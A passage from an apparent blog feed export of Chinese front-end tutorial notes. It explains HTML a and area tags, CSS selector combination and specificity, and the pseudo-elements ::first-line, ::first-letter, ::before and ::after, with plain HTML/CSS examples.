标签，当然了，也可能你学过了本节课以后，觉得自己其实也没那么熟悉。</p><h2 id="a-标签"><a href="#a-标签" class="headerlink" title="a 标签"></a>a 标签</h2><p>a 标签是“anchor”的缩写，它是锚点的意思，所谓锚点，实际上也是一种比喻的用法，古代船舶用锚来固定自己的位置，避免停泊时被海浪冲走，所以 anchor 标签的意思也是标识文档中的特定位置。</p><p>a 标签其实同时充当了链接和目标点的角色，当 a 标签有 href 属性时，它是链接，当它有 name 时，它是链接的目标。</p><p>具有 href 的 a 标签跟一些 link 一样，会产生超链接，也就是在用户不操作的情况下，它们不会被主动下载的被动型链接。</p><p>重点的内容是，a 标签也可以有 rel 属性，我们来简单了解一下，首先是跟 link 相同的一些 rel，包括下面的几种。</p><ul><li>alternate</li><li>author</li><li>help</li><li>license</li><li>next</li><li>prev</li><li>search</li></ul><p>这些跟 link 语义完全一致，不同的是，a 标签产生的链接是会实际显示在网页中的，而 link 标签仅仅是元信息。</p><p>除了这些之外，a 标签独有的 rel 类型：</p><ul><li>tag 表示本网页所属的标签；</li><li>bookmark 到上级章节的链接。</li></ul><p>a 标签还有一些辅助的 rel 类型，用于提示浏览器或者搜索引擎做一些处理：</p><ul><li>nofollow 此链接不会被搜索引擎索引；</li><li>noopener 此链接打开的网页无法使用 opener 来获得当前页面的窗口；</li><li>noreferrer 此链接打开的网页无法使用 referrer 来获得当前页面的 url；</li><li>opener 打开的网页可以使用 window.opener 来访问当前页面的 window 对象，这是 a 标签的默认行为。</li></ul><p>a 标签基本解决了在页面中插入文字型和整张图片超链接的需要，但是如果我们想要在图片的某个区域产生超链接，那么就要用到另一种标签了——area 标签。</p><h2 id="area-标签"><a href="#area-标签" class="headerlink" title="area 标签"></a>area 标签</h2><p>area 标签与 a 标签非常相似，不同的是，它不是文本型的链接，而是区域型的链接。</p><p>area 标签支持的 rel 与 a 完全一样，这里就不多说了。</p><p>area 是整个 html 规则中唯一支持非矩形热区的标签，它的 shape 属性支持三种类型。</p><ul><li>圆形：circle 或者 circ，coords 支持三个值，分别表示中心点的 x,y 坐标和圆形半径 r。</li><li>矩形：rect 或者 rectangle，coords 支持两个值，分别表示两个对角顶点 x1，y1 和 x2，y2。</li><li>多边形：poly 或者 polygon，coords 至少包括 6 个值，表示多边形的各个顶点。</li></ul><p>因为 area 设计的时间较早，所以不支持含有各种曲线的路径，但是它也是唯一一个支持了非矩形触发区域的元素，所以，对于一些效果而言，area 是必不可少的。</p><p>area 必须跟 img 和 map 标签配合使用。使用示例如下（例子来自 html 标准）。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"> Please select a shape:</span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;shapes.png&quot;</span> <span class="attr">usemap</span>=<span class="string">&quot;#shapes&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">alt</span>=<span class="string">&quot;Four shapes are available: a red hollow box, a green circle, a blue triangle, and a yellow four-pointed star.&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">&quot;shapes&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">rect</span> <span class="attr">coords</span>=<span class="string">&quot;50,50,100,100&quot;</span>&gt;</span> <span class="comment">&lt;!-- the hole in the red box --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">rect</span> <span class="attr">coords</span>=<span class="string">&quot;25,25,125,125&quot;</span> <span class="attr">href</span>=<span class="string">&quot;red.html&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Red box.&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">circle</span> <span class="attr">coords</span>=<span class="string">&quot;200,75,50&quot;</span> <span class="attr">href</span>=<span class="string">&quot;green.html&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Green circle.&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">poly</span> <span class="attr">coords</span>=<span class="string">&quot;325,25,262,125,388,125&quot;</span> <span class="attr">href</span>=<span class="string">&quot;blue.html&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Blue triangle.&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">poly</span> <span class="attr">coords</span>=<span class="string">&quot;450,25,435,60,400,75,435,90,450,125,465,90,500,75,465,60&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">href</span>=<span class="string">&quot;yellow.html&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Yellow star.&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个例子展示了在一张图片上画热区并且产生链接，分别使用了矩形、圆形和多边形三种 area。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>17丨HTML&amp;CSS：伪元素是怎么回事儿？</title>
      <link href="/Blog/2019/01/30/relearn_FE/17%E4%B8%A8HTML&amp;CSS%EF%BC%9A%E4%BC%AA%E5%85%83%E7%B4%A0%E6%98%AF%E6%80%8E%E4%B9%88%E5%9B%9E%E4%BA%8B%E5%84%BF%EF%BC%9F/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/17%E4%B8%A8HTML&amp;CSS%EF%BC%9A%E4%BC%AA%E5%85%83%E7%B4%A0%E6%98%AF%E6%80%8E%E4%B9%88%E5%9B%9E%E4%BA%8B%E5%84%BF%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<h2 id="选择器的组合"><a href="#选择器的组合" class="headerlink" title="选择器的组合"></a>选择器的组合</h2><p>在 CSS 规则中，选择器部分是一个选择器列表。</p><p>选择器列表是用逗号分隔的复杂选择器序列；复杂选择器则是用空格、大于号、波浪线等符号连接的复合选择器；复合选择器则是连写的简单选择器组合。</p><p>根据选择器列表的语法，选择器的连接方式可以理解为像四则运算一样有优先级。</p><ul><li>第一优先级<ul><li>无连接符号</li></ul></li><li>第二优先级<ul><li>“空格”</li><li>“~”</li><li>“+”</li><li>“&gt;”</li><li>“||”</li></ul></li><li>第三优先级<ul><li>“,”</li></ul></li></ul><p>例如以下选择器：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.c</span>,<span class="string">.a</span>&gt;<span class="string">.b.d</span> &#123;</span><br><span class="line">    /*<span class="string">......</span>*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们应该理解为这样的结构。</p><ul><li>.c,.a&gt;.b.d<ul><li>.c</li><li>.a&gt;.b.d<ul><li>.a</li><li>.b.d<ul><li>.b</li><li>.d</li></ul></li></ul></li></ul></li></ul><p>复合选择器表示简单选择器中“且”的关系，例如，例子中的“ .b.d ”，表示选中的元素必须同时具有 b 和 d 两个 class。</p><p>复杂选择器是针对节点关系的选择，它规定了五种连接符号。</p><ul><li><strong>“空格”</strong>：后代，表示选中所有符合条件的后代节点， 例如“ .a .b ”表示选中所有具有 class 为 a 的后代节点中 class 为 b 的节点。</li><li><strong>“&gt;”</strong>：子代，表示选中符合条件的子节点，例如“ .a&gt;.b ”表示：选中所有“具有 class 为 a 的子节点中，class 为 b 的节点”。</li><li><strong>“~”</strong> : 后继，表示选中所有符合条件的后继节点，后继节点即跟当前节点具有同一个父元素，并出现在它之后的节点，例如“ .a~.b ”表示选中所有具有 class 为 a 的后继中，class 为 b 的节点。</li><li><strong>“+”</strong>：直接后继，表示选中符合条件的直接后继节点，直接后继节点即 nextSlibling。例如 “.a+.b ”表示选中所有具有 class 为 a 的下一个 class 为 b 的节点。</li><li><strong>“||”</strong>：列选择器，表示选中对应列中符合条件的单元格。</li></ul><p>我们在实际使用时，比较常用的连接方式是“空格”和“&gt;”。</p><p>工程实践中一般会采用设置合理的 class 的方式，来避免过于复杂的选择器结构，这样更有利于维护和性能。</p><p>空格和子代选择器通常用于组件化场景，当组件是独立开发时，很难完全避免 class 重名的情况，如果为组件的最外层容器元素设置一个特别的 class 名，生成 CSS 规则时，则全部使用后代或者子代选择器，这样可以有效避免 CSS 规则的命名污染问题。</p><p>逗号表示“或”的关系，实际上，可以把它理解为“两条内容一样的 CSS 规则”的一种简写。如我们开头的例子，可以理解成与下面的代码等效：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.c</span> &#123;</span><br><span class="line">    /*<span class="string">......</span>*/</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">.a</span>&gt;<span class="string">.b.d</span> &#123;</span><br><span class="line">    /*<span class="string">......</span>*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里，我们就讲完了如何用简单选择器组合成复合选择器和复杂选择器，形成选择器列表，这能够帮助我们应对各种复杂的需求。</p><p>CSS 选择器是基于规则生效的，同一个元素命中多条规则是非常常见的事情。不同规则指定同一个属性为不同值时，就需要一个机制来解决冲突。这个机制，就是接下来我们要讲的选择器优先级。</p><h2 id="选择器的优先级"><a href="#选择器的优先级" class="headerlink" title="选择器的优先级"></a>选择器的优先级</h2><p>CSS 标准用一个三元组 (a, b, c) 来构成一个复杂选择器的优先级。</p><ul><li>id 选择器的数目记为 a；</li><li>伪类选择器和 class 选择器的数目记为 b；</li><li>伪元素选择器和标签选择器数目记为 c；</li><li>“*” 不影响优先级。</li></ul><p>CSS 标准建议用一个足够大的进制，获取“ a-b-c ”来表示选择器优先级。即：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">specificity = <span class="keyword">base </span>* <span class="keyword">base </span>* a + <span class="keyword">base </span>* <span class="keyword">b </span>+ c</span><br></pre></td></tr></table></figure><p>其中，base 是一个“足够大”的正整数。关于 base，历史中有些趣闻，早年 IE6 采用 256 进制，于是就产生“256 个 class 优先级等于一个 id”这样的奇葩问题，后来扩大到 65536，基本避免了类似的问题。</p><p>现代浏览器多采用了更大的数量，我们正常编写的 CSS 规则数量不太可能达到数万，因此我们可以认为这样的 base 就足够大了。</p><p>行内属性的优先级永远高于 CSS 规则，浏览器提供了一个“口子”，就是在选择器前加上“!import”。</p><p>这个用法非常危险，因为它相当于一个新的优先级，而且此优先级会高于行内属性。</p><p>同一优先级的选择器遵循“后面的覆盖前面的”原则，我们可以看一个例子：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">&quot;my&quot;</span> <span class="built_in">class</span>=<span class="string">&quot;x y z&quot;</span>&gt;<span class="built_in">text</span>&lt;<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-class">.x</span>, <span class="selector-class">.z</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>:lightblue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.y</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>:lightgreen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里选择器列表“ .x, .z”命中了 div，但是它的两项分别计算优先级，所以最终优先级仍跟“ .y” 规则相同。</p><p>所以实践中，建议你“根据 id 选单个元素”“class 和 class 的组合选成组元素”“tag 选择器确定页面风格”这样的简单原则来使用选择器，不要搞出过于复杂的选择器。</p><h2 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h2><p>我之所以没有把它放在简单选择器中，是因为伪元素本身不单单是一种选择规则，它还是一种机制。</p><p>目前兼容性达到可用的伪元素有以下几种。</p><ul><li>::first-line</li><li>::first-letter</li><li>::before</li><li>::after</li></ul><p>下面我们就来分别讲讲它们。</p><p><strong>::first-line</strong> 和 <strong>::first-letter</strong> 是比较类似的伪元素，其中一个表示元素的第一行，一个表示元素的第一个字母。</p><p>我们可以看一个示例：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;This is <span class="keyword">a</span> somewhat <span class="keyword">long</span> HTML</span><br><span class="line"><span class="keyword">paragraph</span> that will be broken <span class="keyword">into</span> several</span><br><span class="line"><span class="keyword">lines</span>. The <span class="keyword">first</span> <span class="built_in">line</span> will be identified</span><br><span class="line"><span class="keyword">by</span> <span class="keyword">a</span> fictional tag sequence. The other <span class="keyword">lines</span></span><br><span class="line">will be treated <span class="keyword">as</span> ordinary <span class="keyword">lines</span> <span class="keyword">in</span> <span class="keyword">the</span></span><br><span class="line"><span class="keyword">paragraph</span>.&lt;/p&gt;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-line</span> &#123; </span><br><span class="line">    <span class="attribute">text-transform</span>: uppercase </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段代码把段落的第一行字母变为大写。注意这里的第一行指的是排版后显示的第一行，跟 HTML 代码中的换行无关。</p><p>::first-letter 则指第一个字母。首字母变大并向左浮动是一个非常常见的排版方式。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;This is <span class="keyword">a</span> somewhat <span class="keyword">long</span> HTML</span><br><span class="line"><span class="keyword">paragraph</span> that will be broken <span class="keyword">into</span> several</span><br><span class="line"><span class="keyword">lines</span>. The <span class="keyword">first</span> <span class="built_in">line</span> will be identified</span><br><span class="line"><span class="keyword">by</span> <span class="keyword">a</span> fictional tag sequence. The other <span class="keyword">lines</span></span><br><span class="line">will be treated <span class="keyword">as</span> ordinary <span class="keyword">lines</span> <span class="keyword">in</span> <span class="keyword">the</span></span><br><span class="line"><span class="keyword">paragraph</span>.&lt;/p&gt;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-letter</span> &#123; </span><br><span class="line">    <span class="attribute">text-transform</span>: uppercase;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">2em</span>;</span><br><span class="line">    <span class="attribute">float</span><span class="selector-pseudo">:left</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然听上去很简单，但是实际上，我们遇到的 HTML 结构要更为复杂，一旦元素中不是纯文本，规则就变得复杂了。</p><p>CSS 标准规定了 first-line 必须出现在最内层的块级元素之内。因此，我们考虑以下代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span>First paragraph<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Second paragraph<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&gt;<span class="selector-tag">p</span><span class="selector-id">#a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>:green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::first-line</span> &#123; </span><br><span class="line">    <span class="attribute">color</span>:blue; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码最终结果第一行是蓝色，因为 p 是块级元素，所以伪元素出现在块级元素之内，所以内层的 color 覆盖了外层的 color 属性。</p><p>如果我们把 p 换成 span，结果就是相反的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span>First paragraph<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>Second paragraph<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&gt;<span class="selector-tag">span</span><span class="selector-id">#a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>:green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::first-line</span> &#123; </span><br><span class="line">    <span class="attribute">color</span>:blue; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的最终结果是绿色，这说明伪元素在 span 之外。</p><p>::first-letter 的行为又有所不同，它的位置在所有标签之内，我们把前面的代码换成::first-letter。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span>First paragraph<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>Second paragraph<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&gt;<span class="selector-tag">span</span><span class="selector-id">#a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>:green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::first-letter</span> &#123; </span><br><span class="line">    <span class="attribute">color</span>:blue; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行这段代码，我们可以看到，首字母变成了蓝色，这说明伪元素出现在 span 之内。</p><p>CSS 标准只要求 ::first-line 和 ::first-letter 实现有限的几个 CSS 属性，都是文本相关，这些属性是下面这些。</p><p><img src="/Blog/2019/01/30/relearn_FE/17%E4%B8%A8HTML&CSS%EF%BC%9A%E4%BC%AA%E5%85%83%E7%B4%A0%E6%98%AF%E6%80%8E%E4%B9%88%E5%9B%9E%E4%BA%8B%E5%84%BF%EF%BC%9F/index/img.png"></p><p>接下来我们说说 ::before 和 ::after 伪元素。</p><p>这两个伪元素跟前面两个不同的是，它不是把已有的内容套上一个元素，而是真正的无中生有，造出一个元素。</p><p>::before 表示在元素内容之前插入一个虚拟的元素，::after 则表示在元素内容之后插入。</p><p>这两个伪元素所在的 CSS 规则必须指定 content 属性才会生效，我们看下例子：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.special</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;pseudo! &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要注意一点，::before 和 ::after 还支持 content 为 counter，如：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class=<span class="string">&quot;special&quot;</span>&gt;I&#x27;m <span class="built_in">real</span> element&lt;/p&gt;</span><br><span class="line">p.special::before &#123;</span><br><span class="line">    <span class="built_in">display</span>: <span class="built_in">block</span>;</span><br><span class="line">    <span class="built_in">content</span>: counter(chapno, upper-roman) <span class="string">&quot;. &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这对于实现一些列表样式是非常有用的。</p><p>::before 和 ::after 中支持所有的 CSS 属性。实际开发中，这两个伪元素非常有用，有了这两个伪元素，一些修饰性元素，可以使用纯粹的 CSS 代码添加进去，这能够很好地保持 HTML 代码中的语义，既完成了显示效果，又不会让 DOM 中出现很多无语义的空元素。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>16丨HTML&amp;CSS：CSS 选择器</title>
      <link href="/Blog/2019/01/30/relearn_FE/16%E4%B8%A8HTML&amp;CSS%EF%BC%9ACSS%20%E9%80%89%E6%8B%A9%E5%99%A8/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/16%E4%B8%A8HTML&amp;CSS%EF%BC%9ACSS%20%E9%80%89%E6%8B%A9%E5%99%A8/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>选择器的基本意义是：根据一些特征，选中元素树上的一批元素。</p></blockquote><p>我们把选择器的结构分一下类，那么由简单到复杂可以分成以下几种。</p><ul><li>简单选择器：针对某一特征判断是否选中元素。</li><li>复合选择器：连续写在一起的简单选择器，针对元素自身特征选择单个元素。</li><li>复杂选择器：由“（空格）”“ &gt;”“ ~”“ +”“ ||”等符号连接的复合选择器，根据父元素或者前序元素检查单个元素。</li><li>选择器列表：由逗号分隔的复杂选择器，表示“或”的关系。</li></ul><p>我们可以看到，选择器是由简单选择器逐级组合而成的结构，那么我们就来首先看一下简单选择器。</p><h2 id="简单选择器"><a href="#简单选择器" class="headerlink" title="简单选择器"></a>简单选择器</h2><p>我们在前面说过，简单选择器是针对某一特征判断是否为选中元素。今天我会为你介绍一系列常见的简单选择器，我们把相似的简单选择器放在一起，这样更易于你去记忆。</p><p><img src="/Blog/2019/01/30/relearn_FE/16%E4%B8%A8HTML&CSS%EF%BC%9ACSS%20%E9%80%89%E6%8B%A9%E5%99%A8/index/img.png"></p><h2 id="类型选择器和全体选择器"><a href="#类型选择器和全体选择器" class="headerlink" title="类型选择器和全体选择器"></a>类型选择器和全体选择器</h2><p>我们要介绍的第一个简单选择器就是类型选择器，它根据一个元素的标签名来选中元素。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/* 比如*/</span></span><br><span class="line">div &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这看上去非常简单，但是实际上，我们还<strong>必须要考虑 HTML 或者 XML 元素的命名空间问题</strong>。</p><p>比如我们的 svg 元素，实际上在： <a href="http://www.w3.org/2000/svg">http://www.w3.org/2000/svg</a> 命名空间之下。</p><p>svg 和 HTML 中都有 a 元素，我们若要想区分选择 svg 中的 a 和 HTML 中的 a，就必须用带命名空间的类型选择器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS Bin<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;28&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 100 28&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">desc</span>&gt;</span>Example link01 - a link on an ellipse</span><br><span class="line">  <span class="tag">&lt;/<span class="name">desc</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">&quot;http://www.w3.org&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">y</span>=<span class="string">&quot;100%&quot;</span>&gt;</span>name<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void 0;&quot;</span>&gt;</span>name<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">@namespace svg url(http://www.w3.org/2000/svg);</span><br><span class="line">@namespace html url(http://www.w3.org/1999/xhtml);</span><br><span class="line">svg|a &#123;</span><br><span class="line">  stroke:blue;</span><br><span class="line">  stroke-width:1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html|a &#123;</span><br><span class="line">  font-size:40px</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个特殊的选择器，就是“ * ” ，它称为全体选择器，可以选中任意元素。它的用法跟类型选择器是完全一致的，这里就把它们放到一起介绍了。</p><h2 id="id-选择器与-class-选择器"><a href="#id-选择器与-class-选择器" class="headerlink" title="id 选择器与 class 选择器"></a>id 选择器与 class 选择器</h2><p>id 选择器和 class 选择器都是针对特定属性的选择器。id 选择器是“#”号后面跟随 id 名，class 选择器是“.”后面跟随 class 名。我们来看看基本用法：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#myid &#123;</span></span><br><span 